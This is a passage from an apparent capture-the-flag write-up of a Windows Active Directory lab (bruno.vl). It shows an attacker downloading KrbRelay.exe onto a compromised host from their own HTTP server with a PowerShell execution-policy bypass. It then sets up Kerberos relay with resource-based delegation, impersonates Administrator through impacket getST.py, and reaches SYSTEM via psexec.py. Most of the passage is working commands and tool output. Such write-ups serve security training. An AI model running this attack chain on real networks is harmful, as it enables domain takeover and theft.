CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;WP;ea1b7b93-5  
e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-5  
54)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf0  
1ff;;;S-1-5-21-1536375944-4286418366-3447278137-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)  
name: scrowpc  
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=bruno,DC=vl  
objectClass: top; person; organizationalPerson; user; computer  
objectGUID: d461171f-3b4b-418c-b44b-efd3a31c258e  
objectSid: S-1-5-21-1536375944-4286418366-3447278137-5101  
primaryGroupID: 515  
pwdLastSet: 2026-06-28 18:57:19.585364+00:00  
sAMAccountName: scrowpc$  
sAMAccountType: 805306369  
servicePrincipalName: RestrictedKrbHost/scrowpc.bruno.vl; RestrictedKrbHost/scrowpc; HOST/scrowpc.bruno.vl; HOST/scrowpc  
uSNChanged: 98445  
uSNCreated: 98443  
userAccountControl: WORKSTATION_TRUST_ACCOUNT  
whenChanged: 2026-06-28 18:57:19+00:00  
whenCreated: 2026-06-28 18:57:19+00:00
```

`objectSid: S-1-5-21-1536375944-4286418366-3447278137-5101`

We'll stage `KrbRelay.exe` :

Terminal where `KrbRelay.exe is` :

```bash
> python3 -m http.server 8889 --bind 10.10.14.129  
  
Serving HTTP on 10.10.14.129 port 8889 (http://10.10.14.129:8889/) ...
```

On the `svc_scan` shell, we `cd` to `windows\tasks` (writable) and `get KrbRelay.exe from our http server` :

```bash
C:\Windows\system32>cd C:\windows\tasks  
  
cd C:\windows\tasks  
  
C:\Windows\Tasks>C:\Windows\Tasks>powershell -ep bypass -c "Invoke-WebRequest -Uri http://10.10.14.129:8889/KrbRelay.exe -OutFile C:\windows\tasks\KrbRelay.exe"
```

We got `10.129.238.9 - - [28/Jun/2026 21:17:15] "GET /KrbRelay.exe HTTP/1.1" 200 -` on our `http server` and the `tasks directory on the svc_scan shell` shows the malware :

```
Directory of C:\windows\tasks  
  
06/28/2026  07:17 PM         1,618,432 KrbRelay.exe  
              1 File(s)      1,618,432 bytes  
              0 Dir(s)   2,552,868,864 bytes free
```

We'll then use the `CLSID` and the `objectSid` :

```PowerShell
C:\Windows\Tasks>KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -port 10246  
  
KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -port 10246  
[*] Relaying context: bruno.vl\BRUNODC$  
[*] Rewriting function table  
[*] Rewriting PEB  
[*] GetModuleFileName: System  
[*] Init com server  
[*] GetModuleFileName: C:\Windows\Tasks\KrbRelay.exe  
[*] Register com server  
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABIBUbpfOAjoB8u+EluEeH4AlgAAOgZ//+PJb3Ii/IloyIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:  
  
[*] Forcing SYSTEM authentication  
[*] Using CLSID: 90f18417-f0f1-484e-9d3c-59dceee5dbd8  
System.Runtime.InteropServices.COMException (0x80070422): The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.  
  
The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.  
  
  at KrbRelay.Ole32.CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsid, Object pUnkOuter, CLSCTX dwClsCtx, IStorage pstg, UInt32 cmq, MULTI_QI[] rgmqResults)  
  at KrbRelay.Program.Main(String[] args)  
  
C:\Windows\Tasks>  
C:\Windows\Tasks>KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid D99E6E73-FC88-11D0-B498-00A0C90312F3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -port 10246  
  
KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid D99E6E73-FC88-11D0-B498-00A0C90312F3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -port 10246  
[*] Relaying context: bruno.vl\BRUNODC$  
[*] Rewriting function table  
[*] Rewriting PEB  
[*] GetModuleFileName: System  
[*] Init com server  
[*] GetModuleFileName: C:\Windows\Tasks\KrbRelay.exe  
[*] Register com server  
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAD3JY9eMHHPlyV+nRcsYyJzAuwAAIQZ//+iSsj2yiumTyIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:  
  
[*] Forcing SYSTEM authentication  
[*] Using CLSID: d99e6e73-fc88-11d0-b498-00a0c90312f3  
[*] apReq: 608206d506092a864886f71201020201006e8206c4308206c0a003020105a10302010ea20703050020000000a382050761820503308204ffa003020105a10a1b084252554e4f2e564ca2233021a003020102a11a30181b046c6461701b106272756e6f6  
4632e6272756e6f2e766ca38204c5308204c1a003020112a103020108a28204b3048204af22ee204c912bf40197a31c21943615d6a0a19e00a6650795ca24f07aecb821acae12b7c40915123971c7c274a8d39258a13465dcaa8ef4a2e0e5b99b9756ad3df4078da79  
acd7cd1a2a74ffbd20b6a0717ea394d7f6f39a167cdb21f11ba7c20a7fe9d4ef3cebfff0db450b66c04e4f011725d7526d90f6d1f36d45da3c988bdcceea114cee4654c8e154f14698d79b1f4810ed4001bc0561b0f69aad5eec90a3b21f22e02a1942144eeff11ef2  
2e714fd4bb8a11e65f1702ff5b8f505fac4433a850aebb5f26955d9dcc03d429a108cbdfda9fe80285ab8fa1916ffdfcb36ffff9853186bebc224dc79d53113e5e207e5bf39d6f97c3ff713bde4df194ef9a7931a6bb932e20c498434eac9a47b372d5eeb459797b61  
2295d40796d340e841940c6168256ec976b5c6f3bd660d0f0d274a46cc0b2289708cceb5d9e64012053a5d24e13f299b405fbc06d9beb6ebe35c2f78848a0d485df5b9adeee53ae528d4a9ae2eb0548bd0a3ac5583e7ced66a9bf7c99c398fb49b8ab2437522e6f28e  
76e1b772e5df22c0f8f35ae8da82a470ba65ddcd463058da76ea3b58d895c1e5cebb0c07145cd6c20c61b557b582ce9d3592a710242fc3c19103538c5ed40ebdd38369317afc6fe22dde6f502e5d06506ddc4fd0dd8f6db55ac2922129288d6a825cb031255f1f72e4  
8e3c918ea632a6c633aed81e72419d39cc9421998b0c49aca395d955e4f0d46b1be4e9aae9854708aee77ef5d2d3df01122883ff83d718d96724b02d2c79edbba7ce653fb8ee9ccc0fe0c7282ba7fc870838d47e99ecc276a4dbb246393e26da575e4f0ee07cdda66d  
64d01e60ea6f00fc662b5bf9bc6ef0d24236cdbf379cfd7b9d79b430801cf9378966a34950bd3540652d9d00f6c13d262b4c0b621ed2ef720365e8430d726a4f4774e3e86c08621a71f19ee77cd51a829542e6552e1dffe7ae1be88a22d7974ac08e3db682a71f02d2  
afb301bf0c06625019c6d599180f9d632ba28e16dd1f250008d2b36ce090d0918fc4773c70599f4ec298e3e7a743d8d2e2560ba9f0285bc4d7d2edd2cf44ff9f109cdc4829fbda053deeda4db0389348e68c0a507dcb995c2d7e7e4365a6b5bdc705b55a114aa47379  
1bca978dc3873cf4d71a41a8b05961c1e6cb98599c550a50269e5913cb3cc7b0bd0e6844b361017e7ce904b47b9388b3290ced80adf0394b519c02c8d91e7132c93283dd4900e397b7f61186f7b5011727dc9ee2dc2c4a207e1c3c9649952dff0c8a5b687e2ce21830  
c9800aad6d3224fb56315561af6242d135e97c108a767359fe8136927bde2c308599978ca0bdd3e49d7516c388e57fb5253c80efc92f55930517efdcb705c695585d1bbe2a6397d053b48e6089bf91e6cdf94d1e1f0506aae085ec354a049ae1fa002bc93ceabe65e7  
249c6f288aa855d540c646fd802c357b65083c3f16225590c3b8f54553d0b346701e613cb5bed99f8463caf3df866d1ea101dedefa58248040012e95f999ff80a81cfd54432c5702004a81a26b811f60931846d85d328a0d74ac4a537709ef3fd5dd405790e915ce5f  
9862e5fab469a089ee541aa5a3669e05f4d28bb226d47f33796287cfd0f538b840edde5a8e6326e0409d3d59276c32a05d754d929d6d4189b5798bd0560ef0b71d55fe64d86fadb17570a2ad1cf160009a482019e3082019aa003020112a28201910482018d8960cd9  
52240180168826445945d0d7b2bcc5ba483fa5b81faea6ebb19b50a76741239e1525f3aa26cb2d2907a650fc2196722174477e92bf59b7ee0f01ffa3689f041bbd30fef70597a6981a1f546e2e83e8fc2738ce6f55bff97b80206455567ea3ec4b2cab5a6df29b10c4  
3c9ccf3a828091bd9edba638641dd65275c59f643e81c8c280bf360ea3e08ec7055c113ddf11ae000e13cdc961e8ab0fcdc1864531e8be35bfbe572ca026dddfd95a58acab56b42a3b736dc6a7bd2b4b3a157e9bc126ef5ae7f4338507cbba25a9015489364368cf99  
689848f62a8979d195a5f00e422906c907ca8432da430027a1df5e3b0a5a65315741d60184ed6b4be58ec6bb4e441910dc212d03de1c7130df35493ce4a51e48dbd2386637820971db57695e5a1d06cb5d17754590466f87396feae4e85deedbafc96a374a3da88dc6  
fa1cab0d7ee009660d56eec4d58c22656f93deaf6596ef44d77e8d848bb4a89085a6c1952c549b90aeab2b482e1588d13f0cf9658304a01376417ecc7c680607ff1e0b8c4077ce9d8dc6bb0136af1  
[*] bind: 0  
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS  
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e0be23d8ac8402458ff8c4bb7e557b5e0375549710c80e33232c3106f97c27fe3d25cb7cc577e302a647d42790c5a472f4183318d9f49e02978b6a2e33b6f5663be336bb69516  
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e0be23d8ac8402458ff8c4bb7e557b5e0375549710c80e33232c3106f97c27fe3d25cb7cc577e302a647d42790c5a472f4183318d9f49e02978b6a2e33b6f5663be336bb69516  
8529a6a8a9993054c20209a878d526f711eb359d00917f3002b1a82873f4579d4673b7158c8b7e24  
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED  
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection  
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a2440442a2c0b4f25ecebcbffeed58bbcb0dac0eda9aeec652550dcf2d3b3fcd0a9b40612b1c7dd98b8b5e0e5947993de0b75bea2c66ac662386334e1f3c8af8a6232a24860f  
[*] bind: 0  
[*] ldap_get_option: LDAP_SUCCESS  
[+] LDAP session established  
[*] ldap_modify: LDAP_SUCCESS
```

So now, `scrowpc$` (which we control) has `msDS-AllowedToActOnBehalfOfOtherIdentity` which means we can impersonate the `DC Admin` with it.

We'll use impacket with our computer's delegation rights to get the `Domain Administrator service ticket as credential cache` :

```bash
>  getST.py -dc-ip 10.129.238.9 -spn host/brunodc.bruno.vl -impersonate Administrator 'bruno.vl/scrowpc$:[REDACTED]'  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[-] CCache file is not found. Skipping...  
[*] Getting TGT for user  
[*] Impersonating Administrator  
[*] Requesting S4U2self  
[*] Requesting S4U2Proxy  
[*] Saving ticket in Administrator@host_brunodc.bruno.vl@BRUNO.VL.ccache
```

Then, we'll save the `credential cache` and use it  :

```bash
>  export KRB5CCNAME=/home/vagabond/Administrator@host_brunodc.bruno.vl@BRUNO.VL.ccache

>  psexec.py -k -no-pass bruno.vl/Administrator@brunodc.bruno.vl -dc-ip 10.129.238.9  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Requesting shares on brunodc.bruno.vl.....  
[*] Found writable share ADMIN$  
[*] Uploading file EIaRhPLR.exe  
[*] Opening SVCManager on brunodc.bruno.vl.....  
[*] Creating service IilX on brunodc.bruno.vl.....  
[*] Starting service IilX.....  
[!] Press help for extra shell commands  
Microsoft Windows [Version 10.0.20348.768]  
(c) Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32> whoami  
nt authority\system  
  
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt  
[REDACTED]
```

And we got the root flag.